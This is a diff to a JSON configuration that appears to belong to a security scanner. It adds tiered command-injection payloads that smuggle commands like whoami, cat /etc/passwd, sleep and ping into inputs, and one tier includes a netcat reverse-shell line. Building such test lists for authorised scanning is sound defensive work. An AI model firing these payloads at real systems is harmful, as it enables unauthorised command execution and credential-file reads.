@@ -413,5 +413,68 @@
       "production",
       "localhost"
     ]
+  },
+  "command_injection": {
+    "low": [
+      ";id",
+      "|id",
+      "||id",
+      "&&id",
+      ";ls",
+      "|dir",
+      "&whoami&",
+      "';whoami;'",
+      "%0aid",
+      ";echo test"
+    ],
+    "medium": [
+      ";id",
+      "|id",
+      "$(id)",
+      "`id`",
+      ";whoami",
+      "|whoami",
+      "&whoami",
+      "$(whoami)",
+      "`whoami`",
+      "%0awhoami%0a",
+      ";uname -a",
+      "|uname -a",
+      "|cat /etc/passwd",
+      "|type C:\\Windows\\win.ini",
+      ";echo $HOSTNAME",
+      "|ipconfig",
+      ";ls -la /",
+      "$(ls /)",
+      "`ls /`",
+      "%3bwhoami%3b"
+    ],
+    "high": [
+      "&&whoami&&",
+      "||whoami||",
+      "$(cat /etc/passwd)",
+      "`cat /etc/passwd`",
+      "cmd /c whoami",
+      "sh -c whoami",
+      "%7cwhoami%7c",
+      "%0a whoami %0a",
+      ";sleep 5",
+      "|sleep 5",
+      "&sleep 5&",
+      "$(sleep 5)",
+      "`sleep 5`",
+      "%0asleep 5%0a",
+      ";ping -c 5 127.0.0.1",
+      "|ping -c 5 127.0.0.1",
+      "&ping -n 5 127.0.0.1&",
+      "|ping -n 5 127.0.0.1",
+      "$(ping -c 5 127.0.0.1)",
+      "`ping -c 5 127.0.0.1`",
+      ";echo %COMPUTERNAME%",
+      "|echo %USERNAME%",
+      "$(wget http://127.0.0.1/)",
+      "`nc -e /bin/sh 127.0.0.1 4444`",
+      ";bash -c 'id'"
+    ]
   }
 }
